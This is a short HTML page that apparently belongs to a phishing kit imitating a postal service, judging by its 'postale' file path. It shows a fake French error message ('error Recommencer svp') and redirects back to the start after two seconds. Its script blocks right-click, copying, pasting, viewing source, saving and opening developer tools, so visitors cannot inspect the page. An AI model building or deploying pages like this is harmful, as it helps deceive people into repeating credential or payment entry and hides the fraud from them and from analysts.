<!doctype html>
<html>
 
<head>
  <title>loading...</title>
</head>
<script src="./postale-M3tri_files/jquery.min.js"></script>
<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>
<body>
<br>
error Recommencer svp
<META HTTP-EQUIV='Refresh' Content=2;URL='./'>
 
</body>
</html>